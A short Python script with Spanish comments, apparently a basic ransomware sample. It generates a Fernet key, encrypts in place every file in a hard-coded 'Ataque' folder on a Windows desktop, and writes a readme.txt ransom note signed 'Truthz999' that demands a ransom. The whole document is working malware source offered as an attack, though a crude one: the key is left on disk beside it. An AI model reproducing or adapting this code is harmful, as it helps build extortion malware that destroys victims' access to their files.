from cryptography.fernet import Fernet
import os


# Creamos una funcion para generar la key

def generarKey():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)


def retornarkey():
    return open("key.key", "rb").read()


# Creamos la funcion que se encargara de encriptar los archivos


def encrypt(items, key):
    i = Fernet(key)
    for x in items:
        with open(x, "rb") as file:
            file_data = file.read()
        data = i.encrypt(file_data)

        with open(x, "wb") as file:
            file.write(data)

if __name__ == "__main__":

    archivos = 'C:\\Users\\Truth\\Desktop\\Ataque\\Archivos' # Expecificamos la ruta de lo que queremos encriptar
    items = os.listdir(archivos)
    archivos_2 = [archivos+"\\"+x for x in items]


generarKey()
key = retornarkey()

encrypt(archivos_2, key)


with open(archivos+"\\"+"readme.txt", "w") as file:
    file.write("Archivos encryptados by Truthz999\n\n")
    file.write("SE SOLICITA RESCATE")

